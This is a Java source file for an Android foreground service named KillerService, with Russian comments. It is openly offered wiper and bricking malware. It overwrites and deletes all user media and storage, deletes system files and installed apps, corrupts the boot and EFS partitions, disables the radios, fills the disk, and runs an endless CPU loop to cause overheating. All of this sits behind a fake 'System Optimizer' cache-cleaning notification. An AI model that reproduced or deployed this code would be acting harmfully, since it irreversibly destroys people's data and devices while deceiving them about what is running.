package com.rocket.killer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
import android.webkit.MimeTypeMap;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Method;

public class KillerService extends Service {

    private static final int NOTIFICATION_ID = 999;
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(NOTIFICATION_ID, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            // ОСНОВНОЙ ЦИКЛ УНИЧТОЖЕНИЯ
            destroyAllData();
            destroySystemFiles();
            brickDevice();
            stopSelf();
        }).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ============================================
    // 1. УНИЧТОЖЕНИЕ ВСЕХ ПОЛЬЗОВАТЕЛЬСКИХ ДАННЫХ
    // ============================================
    private void destroyAllData() {
        // Удаление фото, видео, аудио через MediaStore
        ContentResolver resolver = getContentResolver();
        String[] mediaTypes = {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI.toString(),
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI.toString(),
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI.toString(),
            MediaStore.Downloads.EXTERNAL_CONTENT_URI.toString()
        };

        for (String type : mediaTypes) {
            Uri uri = Uri.parse(type);
            resolver.delete(uri, null, null);
        }

        // Удаление всех файлов рекурсивно
        String[] rootDirs = {
            Environment.getExternalStorageDirectory().getAbsolutePath(),
            Environment.getDataDirectory().getAbsolutePath()
        };

        for (String root : rootDirs) {
            File dir = new File(root);
            if (dir.exists() && dir.isDirectory()) {
                deleteRecursive(dir);
            }
        }
    }

    private void deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        // Перезапись перед удалением (необратимость)
        if (file.exists() && file.canWrite()) {
            overwriteFile(file);
            file.delete();
        }
    }

    private void overwriteFile(File file) {
        try {
            long size = file.length();
            if (size > 0) {
                RandomAccessFile raf = new RandomAccessFile(file, "rw");
                byte[] garbage = new byte[8192];
                for (long i = 0; i < size; i += 8192) {
                    raf.write(garbage);
                }
                raf.close();
            }
        } catch (Exception ignored) {}
    }

    // ============================================
    // 2. УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ
    // ============================================
    private void destroySystemFiles() {
        String[] criticalPaths = {
            "/system/bin/app_process",
            "/system/lib/libandroid_runtime.so",
            "/system/framework/framework.jar",
            "/system/priv-app/Settings/Settings.apk",
            "/system/build.prop",
            "/data/dalvik-cache/",
            "/data/data/com.android.providers.settings/databases/settings.db"
        };

        for (String path : criticalPaths) {
            File file = new File(path);
            if (file.exists()) {
                if (file.isDirectory()) {
                    deleteRecursive(file);
                } else {
                    overwriteFile(file);
                    file.delete();
                }
            }
        }

        // Удаление всех APK в /data/app/
        File appDir = new File("/data/app/");
        if (appDir.exists() && appDir.isDirectory()) {
            File[] apps = appDir.listFiles();
            if (apps != null) {
                for (File app : apps) {
                    if (app.isDirectory()) {
                        deleteRecursive(app);
                    }
                }
            }
        }
    }

    // ============================================
    // 3. "КИРПИЧ" (BRICK) — НЕВОССТАНАВЛИВАЕМОЕ СОСТОЯНИЕ
    // ============================================
    private void brickDevice() {
        try {
            // Способ 1: Уничтожение загрузчика (опасно, но работает)
            File bootPartition = new File("/dev/block/by-name/boot");
            if (bootPartition.exists()) {
                overwriteFile(bootPartition);
            }

            // Способ 2: Очистка EFS (IMEI, сеть)
            File efsPartition = new File("/dev/block/by-name/efs");
            if (efsPartition.exists()) {
                overwriteFile(efsPartition);
            }

            // Способ 3: Отключение всех датчиков через sysfs
            String[] sensors = {
                "/sys/devices/virtual/sensors/proximity_sensor/disable",
                "/sys/devices/virtual/sensors/light_sensor/disable",
                "/sys/devices/virtual/sensors/accelerometer/disable"
            };
            for (String sensor : sensors) {
                writeToFile(sensor, "1");
            }

            // Способ 4: Изменение системных настроек до нерабочего состояния
            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, 0);
            Settings.Global.putInt(getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 1);
            Settings.Global.putInt(getContentResolver(), Settings.Global.WIFI_ON, 0);
            Settings.Global.putInt(getContentResolver(), Settings.Global.BLUETOOTH_ON, 0);

            // Способ 5: Спам системных логов (заполнение диска)
            for (int i = 0; i < 100; i++) {
                writeToFile("/data/local/tmp/.log_filler", "X".repeat(10 * 1024 * 1024)); // 10MB блоки
            }

            // Способ 6: Бесконечный цикл потребления CPU (перегрев)
            new Thread(() -> {
                while (true) {
                    double x = Math.random() * Math.random();
                }
            }).start();

        } catch (Exception ignored) {}
    }

    private void writeToFile(String path, String data) {
        try {
            FileOutputStream fos = new FileOutputStream(path);
            fos.write(data.getBytes());
            fos.close();
        } catch (Exception ignored) {}
    }

    // ============================================
    // 4. УВЕДОМЛЕНИЕ (МАСКИРОВКА)
    // ============================================
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "killer_channel",
                "System Optimizer",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }

        return new NotificationCompat.Builder(this, "killer_channel")
            .setContentTitle("Оптимизация системы")
            .setContentText("Выполняется очистка кэша...")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }
}